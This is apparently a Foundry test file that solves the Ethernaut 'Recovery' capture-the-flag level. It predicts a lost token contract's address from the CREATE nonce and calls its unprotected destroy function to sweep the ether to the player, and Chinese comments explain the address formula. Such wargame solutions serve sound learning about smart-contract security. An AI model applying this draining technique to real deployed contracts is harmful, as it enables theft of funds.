// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Recovery, SimpleToken} from "../../src/ethernaut/17_Recovery/Recovery.sol";
import {Recovery_Factory} from "../../src/ethernaut/17_Recovery/Recovery_Factory.sol";
import {Recovery_Attacker} from "./17_Recovery_Attacker.sol";

contract Recovery_Test is Test {
	address deployer = makeAddr("deployer");
	address player = makeAddr("player");

	Recovery_Factory factory;
	Recovery instContract;
	
	modifier checkSolvedByPlayer() {
		vm.startPrank(player, player);
		_;
		vm.stopPrank();
		_isSolved();
	}
	
	/**
	 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
	 */
	function _isSolved() private view {
		if (factory.validateInstance(player)) {
			console.log("\x1b[33m%s\x1b[0m", ">>>>>>>>>>>>>> Congratulations, you have successfully completed the challenge >>>>>>>>>>>>>>");
		} else {
			revert(">>>>>>>>>>>>>> Sorry, you failed the challenge >>>>>>>>>>>>>>");
		}
	}
	
	/**
	 * SETS UP CHALLENGE - DO NOT TOUCH
	 */
	function setUp() public {
		startHoax(deployer);
		
		factory = new Recovery_Factory();
		instContract = Recovery(payable(factory.createInstance{value: 0.001 ether}(player)));
		
		vm.stopPrank();
		
		vm.deal(address(player), 101 ether);
	}
	
	function test__Solution_Recovery() public checkSolvedByPlayer {
		// CODE YOUR SOLUTION HERE
		// forge test --mt test__Solution_Recovery -vv
		
		address tokenAddress = vm.computeCreateAddress(address(instContract), vm.getNonce(address(instContract)) - 1);
		console.log("tokenAddress", tokenAddress);
		SimpleToken	simpleToken_Crack = SimpleToken(payable(tokenAddress));
		simpleToken_Crack.destroy(payable(player));
		
		// 小结：
		// 关键点：CREATE 预测地址，一般很少使用。
		// 但是，切记公式中，没有类似于 CREATE2 的 initCode
		// 而是，address = keccak256(rlp_encode([sender, nonce]))[12:]
	}
}
